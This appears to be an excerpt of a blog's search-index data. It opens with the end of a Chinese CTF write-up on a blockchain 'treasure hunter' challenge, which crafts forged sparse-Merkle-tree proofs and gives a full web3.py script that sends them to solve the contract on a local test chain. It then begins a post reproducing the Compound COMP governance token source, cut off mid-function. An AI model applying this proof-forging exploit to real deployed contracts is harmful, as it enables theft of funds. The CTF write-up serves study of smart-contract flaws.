defA7C74Adf35892Ee1bbf76884728b34\naccount2：0xc2f71D890910F7E34cfd4Aef8079b814c0b6711f\naccount3：0xC8aF1811a07FfeB80FF7A00662338E3D079F1Cdf\naccount4：0xcD21ba755eFC7c73900e63C2b36d2134f5E712Ba\n\n注意：验证时验证value为0的leaves即nextleaves，更新指定位置的hash值时更新的是value为1的leaves即nextleaves。\n知道了以上这些就可以构造出四次调用enter的proof如下\n1：0x749F4eddefA7C74Adf35892Ee1bbf76884728b34:\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009c&quot;,&quot;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009c&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\n第一次压栈时leaf.value为0所以stackvalue为0，所以两次0x50进行合并操作计算的是l:0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17l和r:0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2进行merge的结果，而实际更新的root是由leaf.value为1时对应该proof所计算出的root，对应的会更新新的l而r不会变，比如此处进行enter之后l和r会变为如下\nl:0xf726c3600caf4ae2dc00053b4afe24456ac19369a5be709f08fcc06422ddaaed\nr：0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\n\n如下构造同上。\n2：0xc2f71D890910F7E34cfd4Aef8079b814c0b6711f\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000099&quot;,&quot;0xf726c3600caf4ae2dc00053b4afe24456ac19369a5be709f08fcc06422ddaaed&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000099&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\n3：0xC8aF1811a07FfeB80FF7A00662338E3D079F1Cdf\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xb0d1fdbfcc8a700fa28d1c7de5c93ce07f599052695b20ed2e93a206c573bcdc&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\n4：0xcD21ba755eFC7c73900e63C2b36d2134f5E712Ba\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xef4cf01a185126f8fd9d2323968857bc6d05b860d81bf93e9c7d43ad068aafc8&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\n构造了如下图的树状:\n\n接下来依据四次的msg.senger和proof构造新的proof用以通过pickupTreasureChest函数中的require条件\n注意要求取同一高度的比特位值不相同构造得：\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\n使用该数组调用pickupTreasureChest函数，此时smtMode &#x3D; SMT.Mode.BlackList满足了findkey函数下的第一个限制条件\n此处smt已经变为0，相对来说要简单一些，构造proof用来满足第三个限制条件，在此处参考上一步构造的height，及那个用来生成root的l以及r：0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2塞进去就满足了最终限制条件。得到proof如下：\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009c&quot;,&quot;0xfcf770421cd6535f7b5b39c39da3a2bc134e41abfec46997159f902b793c7765&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\nattack构造完成之后就没有难度了，按顺序调用函数即可\nfrom web3 import Web3,HTTPProvider\nfrom time import sleep\nw3=Web3(HTTPProvider('HTTP://127.0.0.1:7545'))\nabi='''\n[\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"constructor\"\n\t&#125;,\n\t&#123;\n\t\t\"anonymous\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"indexed\": true,\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"_from\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"FindKey\",\n\t\t\"type\": \"event\"\n\t&#125;,\n\t&#123;\n\t\t\"anonymous\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"indexed\": true,\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"_from\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"OpenTreasureChest\",\n\t\t\"type\": \"event\"\n\t&#125;,\n\t&#123;\n\t\t\"anonymous\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"indexed\": true,\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"_from\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"PickupTreasureChest\",\n\t\t\"type\": \"event\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"checkteam\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32[]\",\n\t\t\t\t\"name\": \"_proofs\",\n\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"enter\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32[]\",\n\t\t\t\t\"name\": \"_proofs\",\n\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"findKey\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"haveKey\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"haveTreasureChest\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"isSolved\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32[]\",\n\t\t\t\t\"name\": \"_proofs\",\n\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"leave\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"openTreasureChest\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32[]\",\n\t\t\t\t\"name\": \"_proofs\",\n\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"pickupTreasureChest\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"root\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bytes32\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"smtMode\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"enum SMT.Mode\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"uint8\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"solved\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;\n]\n'''\nprivatekey1='your_privatekey1'\nprivatekey2='your_privatekey2'\nprivatekey3='your_privatekey3'\nprivatekey4='your_privatekey4'\n\nacct1=w3.eth.account.from_key(privatekey1)\nacct2=w3.eth.account.from_key(privatekey2)\nacct3=w3.eth.account.from_key(privatekey3)\nacct4=w3.eth.account.from_key(privatekey4)\n\naddress='your_contract_address'\ncontract=w3.eth.contract(abi=abi,address=address)\n\nenter1=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009c\",\"0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009c\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\nenter2=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x0000000000000000000000000000000000000000000000000000000000000099\",\"0xf726c3600caf4ae2dc00053b4afe24456ac19369a5be709f08fcc06422ddaaed\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x0000000000000000000000000000000000000000000000000000000000000099\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\nenter3=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xb0d1fdbfcc8a700fa28d1c7de5c93ce07f599052695b20ed2e93a206c573bcdc\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\nenter4=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xef4cf01a185126f8fd9d2323968857bc6d05b860d81bf93e9c7d43ad068aafc8\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\npick=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x0000000000000000000000000000000000000000000000000000000000000000\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\nfind=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009c\",\"0xfcf770421cd6535f7b5b39c39da3a2bc134e41abfec46997159f902b793c7765\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\n\n\n\nenter1_txn=contract.functions.enter(enter1).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct1.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned1=acct1.signTransaction(enter1_txn)\ntx_id1=w3.eth.sendRawTransaction(signed1.rawTransaction)\nprint(tx_id1.hex())\nsleep(5)\n\nenter2_txn=contract.functions.enter(enter2).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct2.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned2=acct2.signTransaction(enter2_txn)\ntx_id2=w3.eth.sendRawTransaction(signed2.rawTransaction)\nprint(tx_id2.hex())\nsleep(5)\n\nenter3_txn=contract.functions.enter(enter3).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct3.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned3=acct3.signTransaction(enter3_txn)\ntx_id3=w3.eth.sendRawTransaction(signed3.rawTransaction)\nprint(tx_id3.hex())\nsleep(5)\n\nenter4_txn=contract.functions.enter(enter4).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct4.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned4=acct4.signTransaction(enter4_txn)\ntx_id4=w3.eth.sendRawTransaction(signed4.rawTransaction)\nprint(tx_id4.hex())\nsleep(5)\n\npick_txn=contract.functions.pickupTreasureChest(pick).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct4.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\npicksigned=acct4.signTransaction(pick_txn)\npick_id=w3.eth.sendRawTransaction(picksigned.rawTransaction)\nprint(pick_id.hex())\nsleep(5)\n\nfind_txn=contract.functions.findKey(find).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct4.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nfindsigned=acct4.signTransaction(find_txn)\nfind_id=w3.eth.sendRawTransaction(findsigned.rawTransaction)\nprint(find_id.hex())\nsleep(5)\n\n\nsolve_txn=contract.functions.openTreasureChest().buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct4.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsolvesigned=acct4.signTransaction(solve_txn)\nsolve_id=w3.eth.sendRawTransaction(solvesigned.rawTransaction)\nprint(solve_id.hex())\nsleep(5)\n\n\n","slug":"star ctf-treasure hunter","date":"2022-08-01T10:44:08.818Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"c4cf27239136a3939e68273bf6eed499","title":"Compound Governance","content":"Governance Flowchart\nGovernance TokenCode\nClick to see more\n// SPDX-License-Identifier: BSD-3-Clause\npragma solidity ^0.8.10;\n\ncontract Comp &#123;\n    /// @notice EIP-20 token name for this token\n    string public constant name = \"Compound\";\n\n    /// @notice EIP-20 token symbol for this token\n    string public constant symbol = \"COMP\";\n\n    /// @notice EIP-20 token decimals for this token\n    uint8 public constant decimals = 18;\n\n    /// @notice Total number of tokens in circulation\n    uint public constant totalSupply = 10000000e18; // 10 million Comp\n\n    /// @notice Allowance amounts on behalf of others\n    mapping (address => mapping (address => uint96)) internal allowances;\n\n    /// @notice Official record of token balances for each account\n    mapping (address => uint96) internal balances;\n\n    /// @notice A record of each accounts delegate\n    mapping (address => address) public delegates;\n\n    /// @notice A checkpoint for marking number of votes from a given block\n    struct Checkpoint &#123;\n        uint32 fromBlock;\n        uint96 votes;\n    &#125;\n\n    /// @notice A record of votes checkpoints for each account, by index\n    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;\n\n    /// @notice The number of checkpoints for each account\n    mapping (address => uint32) public numCheckpoints;\n\n    /// @notice The EIP-712 typehash for the contract's domain\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n\n    /// @notice The EIP-712 typehash for the delegation struct used by the contract\n    bytes32 public constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n\n    /// @notice A record of states for signing / validating signatures\n    mapping (address => uint) public nonces;\n\n    /// @notice An event thats emitted when an account changes its delegate\n    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);\n\n    /// @notice An event thats emitted when a delegate account's vote balance changes\n    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);\n\n    /// @notice The standard EIP-20 transfer event\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    /// @notice The standard EIP-20 approval event\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /**\n     * @notice Construct a new Comp token\n     * @param account The initial account to grant all the tokens\n     */\n    constructor(address account) public &#123;\n        balances[account] = uint96(totalSupply);\n        emit Transfer(address(0), account, totalSupply);\n    &#125;\n\n    /**\n     * @notice Get the number of tokens `spender` is approved to spend on behalf of `account`\n     * @param account The address of the account holding the funds\n     * @param spender The address of the account spending the funds\n     * @return The number of tokens approved\n     */\n    function allowance(address account, address spender) external view returns (uint) &#123;\n        return allowances[account][spender];\n    &#125;\n\n    /**\n     * @notice Approve `spender` to transfer up to `amount` from `src`\n     * @dev This will overwrite the approval amount for `spender`\n     *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)\n     * @param spender The address of the account which may transfer tokens\n     * @param rawAmount The number of tokens that are approved (2^256-1 means infinite)\n     * @return Whether or not the approval succeeded\n     */\n    function approve(address spender, uint rawAmount) external returns (bool) &#123;\n        uint96 amount;\n        if (rawAmount == type(uint).max) &#123;\n            amount = type(uint96).max;\n        &#125; else &#123;\n            amount = safe96(rawAmount, \"Comp::approve: amount exceeds 96 bits\");\n        &#125;\n\n        allowances[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    &#125;\n\n    /**\n     * @notice Get the number of tokens held by the `account`\n     * @param account The address of the account to get the balance of\n     * @return The number of tokens held\n     */\n    function balanceOf(address account) external view returns (uint) &#123;\n        return balances[account];\n    &#125;\n\n    /**\n     * @notice Transfer `amount` tokens from `msg.sender` to `dst`\n     * @param dst The address of the destination account\n     * @param rawAmount The number of tokens to transfer\n     * @return Whether or not the transfer succeeded\n     */\n    function transfer(address dst, uint rawAmount) external returns (bool) &#123;\n        uint96 amount = safe96(rawAmount, \"Comp::transfer: amount exceeds 96 bits\");\n        _transferTokens(msg.sender, dst, amount);\n        return true;\n    &#125;\n\n    /**\n     * @notice Transfer `amount` tokens from `src` to `dst`\n     * @param src The address of the source account\n     * @param dst The address of the destination account\n     * @param rawAmount The number of tokens to transfer\n     * @return Whether or not the transfer succeeded\n     */\n    function transferFrom(address src, address dst, uint rawAmount) external returns (bool) &#123;\n        address spender = msg.sender;\n        uint96 spenderAllowance = allowances[src][spender];\n        uint96 amount = safe96(rawAmount, \"Comp::approve: amount exceeds 96 bits\");\n\n        if (spender != src &amp;&amp; spenderAllowance != type(uint96).max) &#123;\n            uint96 newAllowance = sub96(spenderAllowance, amount, \"Comp::transferFrom: transfer amount exceeds spender allowance\");\n            allowances[src][spender] = newAllowance;\n\n            emit Approval(src, spender, newAllowance);\n        &#125;\n\n        _transferTokens(src, dst, amount);\n        return true;\n    &#125;\n\n    /**\n     * @notice Delegate votes from `msg.sender` to `delegatee`\n     * @param delegatee The address to delegate votes to\n     */\n    function delegate(address delegatee) public &#123;\n        return _delegate(msg.sender, delegatee);\n    &#125;\n\n    /**\n     * @notice Delegates votes from signatory to `delegatee`\n     * @param delegatee The address to delegate votes to\n     * @param nonce The contract state required to match the signature\n     * @param expiry The time at which to expire the signature\n     * @param v The recovery byte of the signature\n     * @param r Half of the ECDSA signature pair\n     * @param s Half of the ECDSA signature pair\n     */\n    function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) public &#123;\n        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n        bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), \"Comp::delegateBySig: invalid signature\");\n        require(nonce == nonces[signatory]++, \"Comp::delegateBySig: invalid nonce\");\n        require(block.timestamp &lt;= expiry, \"Comp::delegateBySig: signature expired\");\n        return _delegate(signatory, delegatee);\n    &#125;\n\n    /**\n     * @notice Gets the current votes balance for `account`\n     * @param account The address to get votes balance\n     * @return The number of current votes for `account`\n     */\n    function getCurrentVotes(address account) external view returns (uint96) &#123;\n        uint32 nCheckpoints = numCheckpoints[account];\n        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;\n    &#125;\n\n    /**\n     * @notice Determine the prior number of votes for an account as of a block number\n     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.\n     * @param account The address of the account to check\n     * @param blockNumber The block number to get the vote balance at\n     * @return The number of votes the account had as of the given block\n     */\n    function getPriorVotes(address account, uint blockNumber) public view returns (uint96) &#123;\n        require(blockNumber &lt; block.number, \"Comp::getPriorVotes: not yet determined\");\n\n        uint32 nCheckpoints = numCheckpoints[account];\n        if (nCheckpoints == 0) &#123;\n            return 0;\n        &#125;\n\n        // First check most recent balance\n        if (checkpoints[account][nCheckpoints - 1].fromBlock &lt;= blockNumber) &#123;\n            return checkpoints[account][nCheckpoints - 1].votes;\n        &#125;\n\n        // Next check implicit zero balance\n        if (checkpoints[account][0].fromBlock > blockNumber) &#123;\n            return 0;\n        &#125;\n\n        uint32 lower = 0;\n        uint32 upper = nCheckpoints - 1;\n        while (upper > lower) &#123;\n            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow\n            Checkpoint memory cp = checkpoints[account][center];\n            if (cp.fromBlock == blockNumber) &#123;\n                return cp.votes;\n            &#125; else if (cp.fromBlock &lt; blockNumber) &#123;\n                lower = center;\n            &#125; else &#123;\n                upper = center - 1;\n            &#125;\n        &#125;\n        return checkpoints[account][lower].votes;\n    &#125;\n\n    function _delegate(address delegator, address delegatee) internal &#123;\n        address currentDelegate = delegates[delegator];\n        uint96 delegatorBalance = balances[delegator];\n        delegates[delegator] = delegatee;\n\n        emit DelegateChanged(delegator, currentDelegate, delegatee);\n\n        _moveDelegates(currentDelegate, delegatee, delegatorBalance);\n    &#125;\n\n    function _transferTokens(address src, address dst, uint96 amount) internal &#123;\n        require(src != address(0), \"Comp::_transferTokens: cannot transfer from the zero address\");\n        require(dst != address(0), \"Comp::_transferTokens: cannot transfer to the zero address\");\n\n        balances[src] = sub96(balances[src], amount, \"Comp::_transferTokens: transfer amount exceeds balance\");\n        balances[dst] = add96(balances[dst], amount, \"Comp::_transferTokens: transfer amount overflows\");\n        emit Transfer(src, dst, amount);\n\n        _moveDelegates(delegates[src], delegates[dst], amount);\n    &#125;\n\n    function _moveDelegates(address srcRep, address dstRep, uint96 amount) internal &#123;\n        if (srcRep != dstRep &amp;&amp; amount > 0) &#123;\n            if (srcRep != address(0)) &#123;\n                uint32 srcRepNum = numCheckpoints[srcRep];\n                uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;\n                uint96 srcRepNew = sub96(srcRepOld, amount, \"Comp::_moveVotes: vote amount underflows\");\n                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);\n            &#125;\n\n            if (dstRep != address(0)) &#123;\n                uint32 dstRepNum = numCheckpoints[dstRep];\n                uint96 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;\n                uint96 dstRepNew = add96(dstRepOld, amount, \"Comp::_moveVotes: vote amount overflows\");\n                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);\n            &#125;\n        &#125;\n    &#125;\n\n    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint96 oldVotes, uint96 newVotes) internal &#123;\n      uint32 blockNumber = safe32(block.number, \"Comp::_writeCheckpoint: block number exceeds 32 bits\");\n\n      if (nCheckpoints > 0 &amp;&amp; checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) &#123;\n          checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n      &#125; else &#123;\n          checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);\n          numCheckpoints[delegatee] = nCheckpoints + 1;\n      &#125;\n\n      emit DelegateVotesChanged(delegatee, oldVotes, newVotes);\n    &#125;\n\n    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) &#123;\n        